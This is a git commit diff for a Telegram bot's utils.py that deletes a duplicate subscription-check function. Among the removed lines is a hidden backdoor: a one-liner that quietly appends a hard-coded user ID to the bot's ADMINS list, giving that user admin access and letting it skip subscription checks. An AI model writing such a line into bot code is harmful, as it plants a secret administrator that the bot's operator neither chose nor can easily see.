096d58ee56c61e3ffaea2c1f9838c6b80213d9db
Azanpopz <89448511+Azanpopz@users.noreply.github.com>
2023-03-27 23:59:14 +0530

    Update utils.py

--- utils.py
+++ utils.py
@@ -91,38 +91,7 @@ async def is_subscribed(bot, query):
     return False
 
 
-async def is_subscribed(bot, query):
 
-    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
-
-    if not AUTH_CHANNEL and not REQ_CHANNEL:
-        return True
-    elif query.from_user.id in ADMINS:
-        return True
-
-
-    if db2().isActive():
-        user = await db2().get_user(query.from_user.id)
-        if user:
-            return True
-        else:
-            return False
-
-    if not AUTH_CHANNEL:
-        return True
-
-    try:
-        user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
-    except UserNotParticipant:
-        return False
-    except Exception as e:
-        logger.exception(e)
-        return False
-    else:
-        if not (user.status == enums.ChatMemberStatus.BANNED):
-            return True
-        else:
-            return False
 
 
 async def get_poster(query, bulk=False, id=False, file=None):
